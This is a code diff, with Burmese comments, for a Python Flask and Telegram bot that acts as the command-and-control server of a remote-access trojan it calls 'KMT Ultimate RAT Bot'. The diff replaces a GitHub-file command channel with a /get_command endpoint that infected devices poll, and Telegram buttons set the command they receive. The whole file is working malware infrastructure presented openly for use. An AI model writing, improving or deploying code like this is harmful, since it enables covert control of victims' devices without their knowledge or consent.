@@ -1,47 +1,29 @@
 import os
 import threading
 import telebot
-import requests
-import base64
 from flask import Flask
 
-# 1. Flask App (Render အတွက် Port 10000 ဖွင့်ရန်)
+# 1. Flask App (Render အတွက်)
 app = Flask(__name__)
+
+# လက်ရှိ Command ကို သိမ်းဆည်းရန် Variable (Default က IDLE)
+current_command = "IDLE"
 
 @app.route('/')
 def home():
-    app_status = "KMT Ultimate RAT Bot is running live!"
-    return app_status
+    return "KMT Ultimate RAT Bot is running live!"
 
-# 2. Telegram & GitHub Setup
+# App ဘက်မှ အမိန့်လာယူမည့် API Endpoint
+@app.route('/get_command')
+def get_command():
+    global current_command
+    return current_command
+
+# 2. Telegram Setup
 TOKEN = os.environ.get('BOT_TOKEN')
-GITHUB_TOKEN = os.environ.get('GITHUB_TOKEN')
-REPO_OWNER = "qqq1234ttttt"
-REPO_NAME = "KMT-All-Software-Rat-Control"
-FILE_PATH = "command.txt"
-
 bot = telebot.TeleBot(TOKEN)
 
-# GitHub သို့ Command ပို့သည့် Function
-def update_github(command):
-    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_PATH}"
-    headers = {
-        "Authorization": f"Bearer {GITHUB_TOKEN}", 
-        "Accept": "application/vnd.github+json"
-    }
-    response = requests.get(url, headers=headers)
-    if response.status_code == 200:
-        sha = response.json()['sha']
-        content_encoded = base64.b64encode(command.encode('ascii')).decode('ascii')
-        
-        data = {
-            "message": f"Execute {command}",
-            "content": content_encoded,
-            "sha": sha
-        }
-        requests.put(url, headers=headers, json=data)
-
-# 3. Telegram Control Panel (ခလုတ်များ အစုံအလင်)
+# 3. Telegram Control Panel
 @bot.message_handler(commands=['start', 'panel'])
 def send_control_panel(message):
     markup = telebot.types.InlineKeyboardMarkup(row_width=2)
@@ -65,9 +47,10 @@ def send_control_panel(message):
         parse_mode="Markdown"
     )
 
-# 4. Callback Queries (ခလုတ်များ အလုပ်လုပ်ပုံ)
+# 4. Callback Queries (ခလုတ်နှိပ်သည့်အခါ Command ပြောင်းရန်)
 @bot.callback_query_handler(func=lambda call: True)
 def callback_query(call):
+    global current_command
     chat_id = call.message.chat.id
     
     commands_map = {
@@ -84,8 +67,8 @@ def callback_query(call):
     
     if call.data in commands_map:
         cmd_text, msg_text = commands_map[call.data]
-        update_github(cmd_text)
-        bot.answer_callback_query(call.id, "Command Executed!")
+        current_command = cmd_text  # Render Variable ကို ပြောင်းလဲခြင်း
+        bot.answer_callback_query(call.id, "Command Updated!")
         bot.send_message(chat_id, msg_text)
 
 # 5. Background Thread & Flask Run
